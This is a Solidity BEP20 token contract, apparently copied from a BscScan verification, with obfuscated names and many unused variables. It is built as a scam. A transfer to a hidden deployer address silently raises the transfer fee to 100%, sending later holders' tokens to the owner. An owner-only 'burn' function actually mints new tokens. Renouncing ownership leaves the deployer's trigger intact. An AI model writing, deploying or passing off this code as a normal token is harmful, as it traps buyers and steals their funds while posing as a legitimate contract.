/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 06:35:00 GMT
 */
pragma solidity >=0.4.11;
contract VpAMlU {
address public  TmiTmT = address(0);
address public  ccEkXX = address(0);
address public  EKGvmR = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  zPsFMF = address(0);
address public owner;
address private  CzYcsS = address(0);
uint256 public  IWdwER = 100000000000000000000000;
uint256 public  nUnRWj = 1000000000000000000;
uint256 public  gqXwCm = 10000000000000000000000000000;
string public  name = "bAgIIz";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  kHUtsh = 100000000000000000000;
string public  symbol = "exMplM";
uint256 public  EZBBBj = 100000000000000000000000;
uint256 public constant WzurbO = 9+1;
mapping (address => mapping (address => uint256)) private _allowances;
address public  DRuWdg = address(0);
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  yrThfz = 10000000000000;
uint256 public  FlscAA = 100000000000000000;
uint8 public constant decimals = 18;
address public  YSUhGO = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  IbAXnB = 10000000000000000;
uint256 public  LlSpuk = 10000000000000000000;
constructor ()  {
CzYcsS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "jffFgV");
require(to != address(0), "jffFgV");
require(amount <= balanceOf[from], "jffFgV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WzurbO/yrThfz ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==CzYcsS){
yrThfz = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}